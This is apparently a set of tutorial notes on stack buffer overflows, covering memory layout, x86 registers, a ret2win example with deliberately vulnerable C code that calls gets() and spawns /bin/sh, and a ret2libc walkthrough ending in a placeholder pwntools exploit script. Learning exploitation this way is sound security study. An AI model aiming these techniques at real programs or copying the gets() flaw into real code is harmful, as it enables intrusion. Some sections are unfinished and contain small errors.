# Stack Based Buffer Overflows

## Overview

## The Stack

In general the stack is a part of the region in virtual memory allocated to a program when it is chosen by the scheduler to run. This region is known as the programs address space.

### A Simplified View Of Virtual Memory

+ The bellow diagram represents a programs/processes address space as it appears in virtual memory
+ For a more detailed diagram and explication see [DevSheets Virtual Memory](https://devsheets.cybernetic.coffee/os/virtual-memory/) or [SecSheets VM]()

```
Stack Bottom +------------> +---------------------------------------------------+        +
                            |                                                   |        |
                            |                                                   |        |
                            |                                                   |        |
                            |                   Stack Region                    |        |
                            |                                                   |        |
                            |                                                   |        |     Lower Memory Addresses
                            +------------------------+--------------------------+        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        v                          |        v
Stack Top    +----------->  +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                  Shared Libraries                 |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+        ^
                            |                        ^                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            +------------------------+--------------------------+        |     Higher Memory Addresses
                            |                                                   |        |
                            |                                                   |        |
                            |                   Heap Region                     |        |
                            |                                                   |        |
                            |                                                   |        |
                            +---------------------------------------------------+        +
                            |                                                   |
                            |                      Data                         |
                            |                                                   |
                            +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                      Text                         |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+

```

### Stack Growth

+ Indeed the stack does not grow sideways, but thinking about how the stack grows relative to the processes address space and the heap can be confusing

+ It has in fact been claimed that inverting the direction the stack grows in could be a mitigation to stack based buffer overflows
    + Unfortunately not a meme

+ The important thing to remember is that **conventionally** the stack grows **down in address value**
    + The more we `push` to the stack the **lower** the address that the stack pointer points to (`esp | rsp`)
    + The more we `pop` from the stack the **higher** the address that the stack pointer points to

+ We think of the **top** of the stack as **lowest** address of the stack region in [vm](https://devsheets.cybernetic.coffee/os/virtual-memory/)
+ Thus the **bottom** of the stack is its **highest** address in the stack region
+ It is important to note that **this is not always the case** 
+ Sadly it is just as confusing to flip the logic above in the case of a stack that grows up


## Key x86 Stack Registers 

+ When working on the stack, and overwriting data on it, it is useful to know about a few key registers 
+ These are the registers you will interact with frequently as you smash the stack
+ What the f*ck is an x86?
    + Basically the overarching **instruction set architecture** (now x86-64) used on most modern systems
    + Instruction set = things the cpu can beep boop = spicy integers 
+ A little history ...
    + Computers got smaller
    + But other things got bigger
    + Like the size of instructions
    + Hence our ancient friends the x86 16bit instructions were extended
    + This was the birth of x86 32bit instruction set with `E` prefix registers
    + Now instructions got more chonk --> x86 64bit instructions
    + Programmers couldn't think of another letter to mean extended-extended again so they used a **r**??

### x86-32

+ **eax:** Conventionally (compiler based) stores the address of the return from a function call
+ **esp:** Extended Stack Pointer, points to the most recent data on the stack
+ **ebp:** Extended Base Pointer, points to the bottom of the stack region
+ **eip:** Extended Instruction Pointer, points to the current instruction to be executed in the program



### x86-64

+ **rax:** Conventionally (compiler based) stores the address of the return from a function call
+ **rsp:** Stack Pointer, points to the most recent data on the stack
+ **rbp:** Base Pointer, points to the bottom of the stack region
+ **rip:** Instruction Pointer, points to the current instruction to be executed in the program

## Ret2win

+ Ret2win refers to the tactic or idea of returning to a 'win' function
+ In most cases this 'win' function is artificial subroutine introduced by the challenge creator to reduce the difficulty of exploiting the binary
+ In exceptionally rare cases the 'win' function could be a real function within a legitimate/real binary in the wild which houses code which gives the exploiter control
    + For example a function which pops a shell for some reason, or reads a protected file


### Example

+ Consider the following C sauce

```c

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <time.h>

void win() {
    printf("Herin sleeps the shell\n");
    system("/bin/sh");
}


int guess = 0;

int main(){
	srand(time(NULL));
	char input[10];
	int random = (rand() % (126-32)) + 32;

	printf("Can you guess what number I'm thinking of?\n");

	fgets(input,10,stdin);
	if(!strchr(input, '\n')){
		while(fgetc(stdin)!='\n');
	}

	guess = atoi(input);
	if (guess != random){
		printf("WRONG!!!\nThe number was: %d\n",random);
		printf("Do you want me to check your answer again? y\\n \n");

		gets(input); // gEts bRuH <----------------------------------- ðŸ‘€ðŸ‘€ðŸ‘€

		if(input[0] != 'y'){
			return 0;
		}

		if (guess == random) {
			printf("You still lose...\n");
		}
	}

    return 0;
}


```

+ Note if we didn't have the source code the compiled binaries [disassembly](/todo/tooling) resembles the following

```c


////////////////////////////////////////////// WIN \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

void win(void)
{
    int32_t unaff_EBX;
    int32_t var_4h;
    
    __x86.get_pc_thunk.bx();
    puts(unaff_EBX + 0xcee);
    system(unaff_EBX + 0xd05);
    return;
}

////////////////////////////////////////////// MAIN \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


undefined4 main(void)
{
    undefined4 uVar1;
    int32_t iVar2;
    int32_t unaff_EBX;
    char *str;
    uint32_t var_8h;
    int32_t var_4h;
    undefined4 random;
    
    __x86.get_pc_thunk.bx();
    uVar1 = time(0);
    srand(uVar1);
    iVar2 = rand();
    var_8h = iVar2 % 0x5e + 0x20;
    puts(unaff_EBX + 0xcd4);
    fgets(&str, 10, **(undefined4 **)(unaff_EBX + 0x2ca0));
    iVar2 = strchr(&str, 10);
    if (iVar2 == 0) {
        do {
            iVar2 = fgetc(**(undefined4 **)(unaff_EBX + 0x2ca0));
        } while (iVar2 != 10);
    }
    uVar1 = atoi(&str);
    *(undefined4 *)(unaff_EBX + 0x2cb8) = uVar1;
    if (var_8h != *(uint32_t *)(unaff_EBX + 0x2cb8)) {
        .plt.sec(unaff_EBX + 0xcff, var_8h);
        puts(unaff_EBX + 0xd1c);
        gets(&str);
        if (((char)str == 'y') && (var_8h == *(uint32_t *)(unaff_EBX + 0x2cb8))) {
            puts(unaff_EBX + 0xd4c);
        }
    }
    return 0;
}


```

+ We can see that if we could reach the win function we will be able pop a shell (which is great for us)
+ However nowhere in the code is win called ðŸ¤”
+ So how can we get there ??
+ In the second if block in main

```c

*(undefined4 *)(unaff_EBX + 0x2cb8) = uVar1;
if (var_8h != *(uint32_t *)(unaff_EBX + 0x2cb8)) {
    .plt.sec(unaff_EBX + 0xcff, var_8h);
    puts(unaff_EBX + 0xd1c);
    gets(&str);

    // <-- ... -->

```

+ We see the fastest way to end your development career with a `gets(&str)` function call
+ `gets()` is a dangerous function, why, because it is unguarded
+ Any number of bytes can walk straight through the buffers stack allocation and out onto the rest of the programs stack region
    + With the source code we can see that the buffer `input[10]` is allocated 10 bytes of memory on the stack 
    + This means that any string longer than 9 characters provided as input to the running binary will overflow the buffer and the extra bytes will overwrite the preceding data on the stack
+ But how far do we go? Why? Where?

#### The Return Pointer

+ ~

## Circumventing Mitigations

### Ret2libc

+ Ret2libc refers to the tactic of crafting a overflow exploit in the face of mitigations that prevent execution on the stack by 'living off the land'
+ In this case living off the land refers to utilizing strings and functions which exist within standard C libraries  
+ But wait, why do we have access to so much of the standard C libraries even though our program only uses a small subset of these ?

#### Shared Libraries

+ A shared library is a library that is used by a program but is not statically bound to it at compellation time (that is a static library) 
+ This means that the library that the program wishes too use is loaded into its address space (virtual memory) at runtime (aka when it is selected by the scheduler)
+ This is done as an optimization to reduce memory usage and paging/swapping frequency 
+ You may [recall](https://devsheets.cybernetic.coffee/os/virtual-memory/) that in a virtual memory environment many programs can reference the same physical page where shared libraries are stored 

+ The addresses of shared libraries, including libc of course, can be obtained with `ldd`

`ldd <binary>`

+ So now we have the address where libc starts, but what can we actually do with this ?
+ First lets talk about where we will return


#### Useful Functions

+ libc contains a plethora of functions we could return to  
+ Normally a shell is the ultimate goal
+ At some point I will extend this list but for now I will just talk about **system**

**shell/process**

+ `system("/bin/sh")`

**Retrieving the functions address**

+ We can use gdb to print the address of our desired function in libc with

`pwndbg> p <function>`

+ If we simply overwrite the return pointer with this address however, nothing useful will happen
+ Why?

#### Imitating The Call Stack

+ The issue is that the operating system, or perhaps more accurately the CPU, expects the call stack to appear in a certain way and order
+ To understand this lets look at what the disassembly for a call to `system("/bin/bash")` looks like

**disassembly**

[Disassembly Call Stack System](https://user-images.githubusercontent.com/44337835/120813811-9a9f6800-c591-11eb-8af4-8944559ca2df.png)

+ We see that the compiled code moves the string "/bin/bash" stored at 0x2004 onto the stack just before calling system

[Pushing Bin Bash String to Stack](https://user-images.githubusercontent.com/44337835/120814468-3f21aa00-c592-11eb-91be-3d06e1407a46.png)

+ Without this the program would not be able to execute the system function call with the `"/bin/bash"` argument

**Debugging Trace**

[System Call Stack](https://user-images.githubusercontent.com/44337835/120811787-b4d84680-c58f-11eb-8856-98529e388b89.png)

+ Therefore to make our return to `system` work we must imitate this call stack
    + Note for a simple case like this were we wish to return a shell, essentially a function that should never return, we ignore imitating the moving of the functions (`system`) return address to the stack
+ We have control of the stack so it is possible for us to overwrite memory addresses on the stack with our own
+ But how can we make our `"/bin/sh"` string appear on the stack just before our call to `system`?

#### Finding a Useful Reference 

+ When talking about a reference we refer to a useful string that we may incorporate into our system call
+ Such strings are like
    + `"/bin/sh"`
    + `"/bin/bash"`
    + `"/bin/zsh"`
    + `"/bin/fish"`
+ There are a few ways to get such references
    + Environment variables
    + Existing Stack Address
    + libc
+ We hope to find a reference to such strings in libc as it is the most reliable of the methods
+ To do so we can use strings with a grep pipe

`strings strings -a -t x /lib/<path-to-libc> | grep "/bin/sh"`

+ This should return an address in hex which we can add to the start of libcs address range in its address space
+ The starting address of libc in the processes memory can be obtained with gdb as follows

`pwndbg> info proc map`

+ Taking the first address for libc to appear in the list as the address
+ Confirm that this reference does indeed lead to the reference with

`pwndbg> x/s <libc-hex-address> + <reference address>`

+ Now lets look at how we inject this payload into the running binary

##### Writing The Exploit With Pwntools

+ Implementing the above approaches we obtain an exploit script similar to the following
+ Note replace all `<...>` with appropriate values from above

```python

from pwn import *

## Assumes x86-32

proc_s = process('./<binary>')                                    # <-- Replace with your binary

padding = b'<padding/offset-bytes>'
system_address = p32(<0xsystem-address>)
eax_system = b'AAAA'                                              # <-- Dummy Function Return Pointer
bin_reference = p32(<0xlibc-offset-reference>)                    # <-- libc address of reference 

payload = padding + system_address + eax_system + bin_reference

# <-- Insert recvlines() as needed -->
proc_s.sendline(payload)
proc_s.interactive()

```